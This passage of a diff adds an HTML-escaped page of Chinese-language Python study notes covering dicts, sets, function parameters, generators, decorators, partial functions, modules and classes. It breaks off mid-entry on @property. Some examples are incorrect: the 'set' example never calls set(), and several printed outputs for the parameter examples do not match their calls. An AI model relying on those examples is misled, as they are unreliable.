+&lt;code&gt;continue&lt;&#x2F;code&gt;  停止当前次执行，继续循环判断&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h3 id=&quot;2-6-shu-ju-ji-he-dict-he-set&quot;&gt;2.6 数据集合：dict 和 set&lt;a class=&quot;zola-anchor&quot; href=&quot;#2-6-shu-ju-ji-he-dict-he-set&quot; aria-label=&quot;Anchor link for: 2-6-shu-ju-ji-he-dict-he-set&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;dict&lt;&#x2F;code&gt; &lt;code&gt;&amp;lt;大括号&amp;gt; {}&lt;&#x2F;code&gt; (dictionary) &lt;code&gt;Java中的map&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;pre&gt;&lt;code&gt;d={&amp;#x27;a&amp;#x27;:1,&amp;#x27;b&amp;#x27;:2,&amp;quot;c&amp;quot;:3}
+d[&amp;#x27;a&amp;#x27;] 输出 1
+d[&amp;#x27;a&amp;#x27;] =&amp;#x27;1a&amp;#x27; #赋值
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;ul&gt;
+&lt;li&gt;是否存在key，返回 True 或 False&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;`&amp;lt;key&amp;gt; in &amp;lt;dict&amp;gt;`
+`&amp;lt;dict&amp;gt;.get(&amp;lt;key&amp;gt;)` #不存在返回 None
+`&amp;lt;dict&amp;gt;.get(&amp;lt;key&amp;gt;,&amp;lt;defaultValue&amp;gt;)` #不存在返回 &amp;lt;defaultValue&amp;gt;
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;ul&gt;
+&lt;li&gt;删除 &lt;code&gt;&amp;lt;dict&amp;gt;.pop(&amp;lt;key&amp;gt;)&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;set&lt;&#x2F;code&gt; &lt;code&gt;&amp;lt;小括号&amp;gt; ()&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;pre&gt;&lt;code&gt;定义	:需要list数组
+a = [1,2,3]
+b=set(a) 或 b =set([1,2,3]) 
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;ul&gt;
+&lt;li&gt;add &lt;code&gt;&amp;lt;set&amp;gt;.add(&amp;lt;key&amp;gt;)&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;remove &lt;code&gt;&amp;lt;set&amp;gt;.remove(&amp;lt;key&amp;gt;)&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;逻辑操作 &lt;code&gt;&amp;amp;&lt;&#x2F;code&gt;、&lt;code&gt;|&lt;&#x2F;code&gt; 、 &lt;code&gt;-&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;s1=([1,2,3])
+s2=([2,3,4])
+s1 &amp;amp; s2 输出 {2,3}
+s1 | s2 输出 {1,2,3,4}
+s1 - s2 输出 {1}
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h3 id=&quot;2-7-han-shu&quot;&gt;2.7 函数&lt;a class=&quot;zola-anchor&quot; href=&quot;#2-7-han-shu&quot; aria-label=&quot;Anchor link for: 2-7-han-shu&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;ul&gt;
+&lt;li&gt;1.函数定义：  &lt;code&gt;def&lt;&#x2F;code&gt; &amp;lt;method_name&amp;gt;(params)&lt;code&gt;:&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;2.空函数： &lt;code&gt;def&lt;&#x2F;code&gt; &amp;lt;method_name&amp;gt;()&lt;code&gt;:&lt;&#x2F;code&gt; &lt;code&gt;pass&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;3.return：
+&lt;ul&gt;
+&lt;li&gt;1.return表示结束,等价于 return None&lt;&#x2F;li&gt;
+&lt;li&gt;2.不写默认返回 return None&lt;&#x2F;li&gt;
+&lt;li&gt;3.返回tuple类型可省略&lt;code&gt;()&lt;&#x2F;code&gt;,PS: return (x,y) 变为 return x,y&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;4.导入模块(.py文件)：
+&lt;ul&gt;
+&lt;li&gt;1.引入整个模块：&lt;code&gt;import&lt;&#x2F;code&gt; math 说明导入math包
+PS:自定义文件tri.py，&lt;code&gt;import tri&lt;&#x2F;code&gt;引入tri文件到内存 通过 tri.&amp;lt;mothod&amp;gt;()访问&lt;&#x2F;li&gt;
+&lt;li&gt;2.导入模块中的某个方法：
+&lt;ul&gt;
+&lt;li&gt;某个函数：  &lt;code&gt;from&lt;&#x2F;code&gt; &amp;lt;文件名&amp;gt; &lt;code&gt;import&lt;&#x2F;code&gt; &amp;lt;函数名&amp;gt;&lt;&#x2F;li&gt;
+&lt;li&gt;全部函数：&lt;code&gt;from&lt;&#x2F;code&gt; &amp;lt;文件名&amp;gt; import *&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;5.参数：&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;必选参数&lt;&#x2F;li&gt;
+&lt;li&gt;1.默认参数，&lt;code&gt;参数&lt;&#x2F;code&gt;=&lt;code&gt;值&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;默认参数必须指向不变对象&lt;&#x2F;code&gt;，如果值是&lt;code&gt;[]&lt;&#x2F;code&gt;，那么每次调用都是原来的&lt;code&gt;[]&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;def power(x,n=2):
+	pass
+调用方式：
+1.power(5),默认n=2
+2.power(5,3)
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;ul&gt;
+&lt;li&gt;2.可变参数： &lt;code&gt;*&lt;&#x2F;code&gt;params&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;def count(*params):
+	sum = 0;
+	for p in params:
+		sum = sum +p
+	return sum
+调用方式：
+1.count(1) 输出 1
+2.count(1,2,3) 输出 6
+3.count(*[1,2,3]) 输出 6
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;ul&gt;
+&lt;li&gt;3.关键字参数： &lt;code&gt;**&lt;&#x2F;code&gt;params&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;def student(name,age,**params):
+	print(&amp;quot;name&amp;quot;,name,&amp;#x27;age&amp;#x27;,age,&amp;#x27;params&amp;#x27;,params)
+调用：
+1.student(&amp;#x27;a&amp;#x27;,12) 输出  name a age 12 params {}
+2.student(&amp;#x27;b&amp;#x27;,12,a=122,b=1223) 输出 name b age 12 params {&amp;#x27;a&amp;#x27;: 122, &amp;#x27;b&amp;#x27;: 1223}
+3.student(1,2,**{&amp;#x27;a&amp;#x27;:2}) 输出 name 1 age 2 params {&amp;#x27;a&amp;#x27;: 2}
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;ul&gt;
+&lt;li&gt;4.命令关键字参数： &lt;code&gt;*,&amp;lt;key1&amp;gt;,&amp;lt;key2&amp;gt;&lt;&#x2F;code&gt; (PS:如果前面有可变参数，可不用加&lt;code&gt;*,&lt;&#x2F;code&gt;)&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;def student(name,age,*,gender,city):
+	print(&amp;#x27;name&amp;#x27;,name,&amp;#x27;age&amp;#x27;,age,gender,city)
+调用：
+1.student(&amp;#x27;a&amp;#x27;,110) 输出 TypeError..
+2.student(&amp;#x27;a&amp;#x27;,123,gender=&amp;#x27;male&amp;#x27;,city=&amp;#x27;fz&amp;#x27;) 输出 name 1 age 2 male fz
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;ul&gt;
+&lt;li&gt;5.参数组合：顺序- 必选参数-&amp;gt;默认参数-&amp;gt;可变参数-&amp;gt;命令关键字参数-&amp;gt;关键字参数&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;def s(a,b,c=0,*d,city,**kw):
+	print(&amp;#x27;a=&amp;#x27;,a,&amp;#x27;b=&amp;#x27;,b,&amp;#x27;c=&amp;#x27;,c,&amp;#x27;d=&amp;#x27;,d,&amp;#x27;city=&amp;#x27;,city,&amp;#x27;kw=&amp;#x27;,kw)
+调用：
+1.s(1,2,city=22)
+输出 a= 1 b= 2 c= 0 d= () city=22 kw= {}
+2.s(1,2,3,4,5,city=22,a=1,b=2)	
+输出 a= 1 b= 2 c= 3 d= (4, 5) city= 22 kw= {&amp;#x27;d&amp;#x27;: 1, &amp;#x27;e&amp;#x27;: 2}
+3.s(1,2,3,4,5) 输出TypeError：missing city
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h3 id=&quot;2-8gao-ji-te-xing&quot;&gt;2.8高级特性&lt;a class=&quot;zola-anchor&quot; href=&quot;#2-8gao-ji-te-xing&quot; aria-label=&quot;Anchor link for: 2-8gao-ji-te-xing&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;ul&gt;
+&lt;li&gt;1.切片(Slice)：取数组元素的简便方式
+&lt;ul&gt;
+&lt;li&gt;默认是索引0开始并且递增速度1,可反向索引&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;[0:3]&lt;&#x2F;code&gt;或&lt;code&gt;[:3]&lt;&#x2F;code&gt; 取数组 [0],[1],[2]&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;[-1:]&lt;&#x2F;code&gt; 取数组 [2]&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;[:]&lt;&#x2F;code&gt; 取全部&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;[::5]&lt;&#x2F;code&gt; 在全部中，每个5个取一个&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;[:10:2]&lt;&#x2F;code&gt; 在数组0~9的元素中每隔2个取一个&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;2.列表生成式：列表的每个元素进行一次表达式计算
+&lt;ul&gt;
+&lt;li&gt;格式： &lt;code&gt;[&amp;lt;变量的表达式&amp;gt; for &amp;lt;变量&amp;gt; in &amp;lt;序列&amp;gt;]&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;def L2(L):
+	L2 = []
+	for x in L:
+		L2.append(x*x)
+	return L2
+调用： [1,2,3] -&amp;gt;[1,4,9]
+1.sum2(list(range(1,4)))
+2.列表生成式: [x*x for x in range(1,4)]
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;3.生成器(Generator)：动态生成列表的每个元素，可通过&lt;code&gt;next(&amp;lt;Generator&amp;gt;)&lt;&#x2F;code&gt;进行访问
+&lt;ul&gt;
+&lt;li&gt;1.列表表达式改为小括号 &lt;code&gt;(&amp;lt;变量的表达式&amp;gt; for &amp;lt;变量&amp;gt; in &amp;lt;序列&amp;gt;)&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;2.设置函数中的&lt;code&gt;yield&lt;&#x2F;code&gt;，变成一个Generator，函数每次调用返回一个新的Generator&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;g.send(&amp;lt;参数&amp;gt;)&lt;&#x2F;code&gt;:传入值，并调用&lt;code&gt;next(g)&lt;&#x2F;code&gt;,g=Generator&lt;&#x2F;li&gt;
+&lt;li&gt;return时，StopIteration&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;杨辉三角： C(n,i)=C(n-1,i-1)+C(n-1,i)
+递归关系式 (n&amp;gt;1,1&amp;lt;=i&amp;lt;=n n表示行,i表示第n行的第i个数) C(1,1)=1
+	def triangles():
+	L = [1]
+	while True:
+		yield L
+		L = [sum(i) for i in zip([0]+L,L+[0])] #补[0]作用：行项+1，每个项是[n-1,n]队列
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h3 id=&quot;2-9-han-shu-shi-bian-cheng&quot;&gt;2.9 函数式编程&lt;a class=&quot;zola-anchor&quot; href=&quot;#2-9-han-shu-shi-bian-cheng&quot; aria-label=&quot;Anchor link for: 2-9-han-shu-shi-bian-cheng&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;1.定义：一种抽象程度很高的程序范式，纯粹的函数式编程没有变量。任意函数输入确定，那么输出
+也确定，称为没有副作用。对于有变量的相同输入，可能有不同输出，称为有副作用。&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;2.高阶函数：&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;特点：
+&lt;ul&gt;
+&lt;li&gt;1.允许函数作为一个&lt;code&gt;变量&lt;&#x2F;code&gt;、函数&lt;code&gt;返回值&lt;&#x2F;code&gt;。&lt;&#x2F;li&gt;
+&lt;li&gt;2.&lt;code&gt;函数名变量&lt;&#x2F;code&gt;：函数名作为变量&lt;&#x2F;li&gt;
+&lt;li&gt;3.&lt;code&gt;函数参数&lt;&#x2F;code&gt;：可接收另一个函数作为参数&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;map&#x2F;reduce
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;map(&amp;lt;method_name&amp;gt;,&amp;lt;Iterable&amp;gt;)&lt;&#x2F;code&gt;
+&lt;code&gt;return &amp;lt;Iterator&amp;gt;，需要list(&amp;lt;Iterator&amp;gt;)变为列表&lt;&#x2F;code&gt;&lt;br &#x2F;&gt;
+其中&lt;code&gt;&amp;lt;Iterable&amp;gt;&lt;&#x2F;code&gt;的每个元素都被&lt;code&gt;&amp;lt;method_name&amp;gt;&lt;&#x2F;code&gt;作用一次&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;reduce(&amp;lt;method_name&amp;gt;,&amp;lt;Iterable&amp;gt;)&lt;&#x2F;code&gt;
+&lt;ul&gt;
+&lt;li&gt;1.需要引入 &lt;code&gt;from functools import reduce&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;2.&lt;code&gt;&amp;lt;method_name&amp;gt;&lt;&#x2F;code&gt;需要2个参数，
+返回的值继续和&lt;code&gt;&amp;lt;Iterable&amp;gt;&lt;&#x2F;code&gt;的下一个值进行函数计算&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;filter：&lt;code&gt;filter(&amp;lt;method_name&amp;gt;,&amp;lt;Iterable&amp;gt;)&lt;&#x2F;code&gt;和&lt;code&gt;map&lt;&#x2F;code&gt;函数类似
+不同的是&lt;code&gt;&amp;lt;method_name&amp;gt;&lt;&#x2F;code&gt;根据返回True&#x2F;False，&lt;code&gt;&amp;lt;Iterable&amp;gt;&lt;&#x2F;code&gt;过滤False的item&lt;&#x2F;li&gt;
+&lt;li&gt;sorted: &lt;code&gt;sorted(&amp;lt;Iterable&amp;gt;,**kw)&lt;&#x2F;code&gt;，&lt;code&gt;&amp;lt;Iterable&amp;gt;&lt;&#x2F;code&gt;进行排序
+其中&lt;code&gt;**kw&lt;&#x2F;code&gt;，可选择接受 &lt;code&gt;key=&amp;lt;method_name&amp;gt;&lt;&#x2F;code&gt;(PS:abs,str.lower)自定义排序，
+reverse=True反向排序&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;3.返回函数：&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;返回函数，需要变量进行函数调用，每次调用返回新的函数&lt;&#x2F;li&gt;
+&lt;li&gt;闭包：能够读取函数内部变量的函数（定义在函数内部的函数）
+&lt;code&gt;返回函数不要引用引起变化的局部变量&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;4.匿名函数：&lt;code&gt;lambda &amp;lt;变量&amp;gt;:&amp;lt;表达式&amp;gt;&lt;&#x2F;code&gt;只是个表达式，可被变量引用&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;5.装饰器：在原有函数定义不需要改变下，增加新内容并返回函数的引用&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;__name__&lt;&#x2F;code&gt;函数名称&lt;&#x2F;li&gt;
+&lt;li&gt;1.&lt;code&gt;@&lt;&#x2F;code&gt; 修饰符&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;def log(f):
+	@functools.wraps(f)
+	def wrapper(*args,**kw):
+		print(&amp;#x27;wrapper %s func&amp;#x27;%f.__name__)
+		return f(*args,**kw)
+	return wrapper
+@log
+def now():
+	print(&amp;#x27;now&amp;#x27;)
+其中，@log修饰 等价于  now = log(now)
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;ul&gt;
+&lt;li&gt;2.原始函数的一些属性复制到装饰器函数
+&lt;ul&gt;
+&lt;li&gt;import functools&lt;&#x2F;li&gt;
+&lt;li&gt;@functools.wraps(&amp;lt;func_params&amp;gt;)&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;6.偏函数：&lt;code&gt;functools.partial(&amp;lt;method_name&amp;gt;,*args,**kw)&lt;&#x2F;code&gt;
+其中*args在前**kw在后&lt;&#x2F;p&gt;
+&lt;pre&gt;&lt;code&gt;import functools
+int(&amp;#x27;100&amp;#x27;,2) 输出4
+int(&amp;#x27;100&amp;#x27;,base=2) 输出4
+int2 = functools.partial(int,base=2) #默认int函数是10进制
+int2(&amp;#x27;100&amp;#x27;)输出4
+PS:
+int2 = functools.partial(int,2)?
+int2(&amp;#x27;100&amp;#x27;) 输出 TypeError，因为调用int2(&amp;#x27;100&amp;#x27;) 等价于 int(2,&amp;#x27;100&amp;#x27;)
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre&gt;&lt;code&gt;functools.partial源码
+def partial(func, *args, **keywords):
+	def newfunc(*fargs, **fkeywords):
+		newkeywords = keywords.copy()
+        newkeywords.update(fkeywords)
+        return func(*args, *fargs, **newkeywords)
+    newfunc.func = func
+    newfunc.args = args
+    newfunc.keywords = keywords
+    return newfunc
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h3 id=&quot;2-10-shi-yong-mo-kuai&quot;&gt;2.10 使用模块&lt;a class=&quot;zola-anchor&quot; href=&quot;#2-10-shi-yong-mo-kuai&quot; aria-label=&quot;Anchor link for: 2-10-shi-yong-mo-kuai&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;ul&gt;
+&lt;li&gt;1.导入模块: PS:import sys 就可以使用sys变量来访问模块全部内容&lt;&#x2F;li&gt;
+&lt;li&gt;2.模块内部：
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;1.模块特殊变量&lt;code&gt;__name__&lt;&#x2F;code&gt;，当运行当前模块文件&lt;code&gt;__name__&lt;&#x2F;code&gt; ==&lt;code&gt;__main__&lt;&#x2F;code&gt;是True，否则False&lt;&#x2F;p&gt;
+&lt;pre&gt;&lt;code&gt;hello.py
+
+def test():
+	print(&amp;quot;hello world&amp;quot;)
+if __name__ ==&amp;#x27;__main__&amp;#x27;
+	test()
+当 python hello.py
+	输出 hello world 
+当 import hello 将不会执行 test()
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;2.类似&lt;code&gt;__xxx__&lt;&#x2F;code&gt;这样的变量是特殊变量，可以被直接引用，但是有特殊用途&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;3.类似&lt;code&gt;_xxx和__xxx&lt;&#x2F;code&gt;这样的变量或函数就是非公开的（private 模块内部使用）,规定不能访问&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;(只是内部改变了变量命名名称，python无法完全限制访问)&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;3.安装第三方模块：pip install &amp;lt;module_name&amp;gt;
+&lt;ul&gt;
+&lt;li&gt;添加模块搜索路径&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;import sys
+sys.path 查看模块
+sys.path.append(&amp;quot;路径&amp;quot;)
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;ul&gt;
+&lt;li&gt;设置PYTHON_PATH&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h3 id=&quot;2-11-mian-xiang-dui-xiang-bian-cheng&quot;&gt;2.11 面向对象编程&lt;a class=&quot;zola-anchor&quot; href=&quot;#2-11-mian-xiang-dui-xiang-bian-cheng&quot; aria-label=&quot;Anchor link for: 2-11-mian-xiang-dui-xiang-bian-cheng&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;ul&gt;
+&lt;li&gt;1.类和实例
+&lt;ul&gt;
+&lt;li&gt;定义： &lt;code&gt;class &amp;lt;class_name&amp;gt;(object):&lt;&#x2F;code&gt; 表示&lt;code&gt;&amp;lt;class_name&amp;gt;&lt;&#x2F;code&gt;继承自object&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;__init__(self,params)&lt;&#x2F;code&gt; 对象创建时，如果必须传递的参数params，可以使用该方法&lt;&#x2F;li&gt;
+&lt;li&gt;类的方法，第一个参数固定是self，其他和函数定义一样&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;2.访问限制
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;__xx__&lt;&#x2F;code&gt;标识特殊变量，可以访问&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;__xx&lt;&#x2F;code&gt;标识变量，表示private,不允许访问&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;_xx&lt;&#x2F;code&gt;标识变量，约定成俗，表示private
+(只是python解释器会把这种变量解释成不一样名称防止外部直接访问)&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;3.继承和多态
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;class &amp;lt;class_name&amp;gt;(&amp;lt;继承的类&amp;gt;)&lt;&#x2F;code&gt;，继承父类方法和父类中&lt;code&gt;__init__&lt;&#x2F;code&gt;方法设置的变量，覆写父类方法
+-&lt;code&gt;鸭子类型&lt;&#x2F;code&gt;(file-like object),只有变量对象有这个&lt;code&gt;方法&lt;&#x2F;code&gt;、&lt;code&gt;变量&lt;&#x2F;code&gt;就可以，不管这个对象是否是子类&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;4.获取对象信息
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;type(&amp;lt;参数&amp;gt;)&lt;&#x2F;code&gt;函数：获取&lt;code&gt;参数&lt;&#x2F;code&gt;的类型。&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;import types&lt;&#x2F;code&gt; 导入types模块
+一些类型，可进行判断
+&lt;code&gt;types.FunctionType&lt;&#x2F;code&gt;
+&lt;code&gt;types.BuiltinFunctionType&lt;&#x2F;code&gt;
+&lt;code&gt;types.LambdaType&lt;&#x2F;code&gt;
+&lt;code&gt;types.GeneratorType&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;isinstance(变量,类型)&lt;&#x2F;code&gt;，可用于判断自定义的类，方法类型
+&lt;code&gt;isinstance(变量,(类型1,类型2))&lt;&#x2F;code&gt;,可用于判断是否是&lt;code&gt;类型1&lt;&#x2F;code&gt;，&lt;code&gt;类型2&lt;&#x2F;code&gt;之一&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;dir(&amp;lt;对象实例&amp;gt;)&lt;&#x2F;code&gt;,获取对象所有属性和方法&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;len(&#x27;ABC&#x27;)等价于&#x27;ABC&#x27;.__len__()&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;hasattr(&amp;lt;对象实例&amp;gt;,&amp;lt;属性&amp;gt;)&lt;&#x2F;code&gt;,判断是否存在这个&lt;code&gt;&amp;lt;属性&amp;gt;&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;setattr(&amp;lt;对象实例&amp;gt;,&amp;lt;属性&amp;gt;,[属性默认值])&lt;&#x2F;code&gt;,设置&lt;code&gt;&amp;lt;属性&amp;gt;&lt;&#x2F;code&gt;值&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;getattr(&amp;lt;对象实例&amp;gt;,&amp;lt;属性&amp;gt;)&lt;&#x2F;code&gt;,获取&lt;code&gt;&amp;lt;属性&amp;gt;&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;类属性和实例属性&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;class A(object):
+	name = &amp;#x27;A&amp;#x27; #类属性，直接通过 A.name访问
+	def __init__(self,a):
+	 	self.a =a #实例属性
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h3 id=&quot;2-12-mian-xiang-dui-xiang-gao-ji-bian-cheng&quot;&gt;2.12 面向对象高级编程&lt;a class=&quot;zola-anchor&quot; href=&quot;#2-12-mian-xiang-dui-xiang-gao-ji-bian-cheng&quot; aria-label=&quot;Anchor link for: 2-12-mian-xiang-dui-xiang-gao-ji-bian-cheng&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;1.动态绑定&lt;code&gt;变量&lt;&#x2F;code&gt;和&lt;code&gt;方法&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;pre&gt;&lt;code&gt;from types import MethodType 
+def hao():
+	print(&amp;#x27;hh&amp;#x27;)
+class A(object):
+	pass
+a = A()
+a.name=&amp;#x27;aa&amp;#x27; #动态绑定变量，只作用当前实例
+a.hao=MethodType(hao,a) #动态绑定方法，只作用当前实例
+A.hao=hao #类的所有实例绑定方法
+print(a.name)
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;2.使用&lt;code&gt;__slots__&lt;&#x2F;code&gt; 限制实例绑定的属性&lt;&#x2F;p&gt;
+&lt;pre&gt;&lt;code&gt;class A(object):
+	__slots__=(&amp;#x27;name&amp;#x27;,&amp;#x27;age&amp;#x27;) #tuple类型，表示只允许添加name和age的属性
+class A2(A):
+	pass
+a = A()
+a.name=&amp;#x27;a&amp;#x27;
+a.age=&amp;#x27;b&amp;#x27;
+a.sc=&amp;#x27;c&amp;#x27;#AttributeError
+a = A2()
+a.sc = &amp;#x27;c&amp;#x27; #子类，不受影响
+#如果A2增加`__slots__=(&amp;#x27;sc&amp;#x27;)`那么A2将限制包括父类的name,age和sc，3个属性
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;3.&lt;code&gt;@property&lt;&#x2F;code&gt;，修饰一个方法，用于属性直接可读操作，
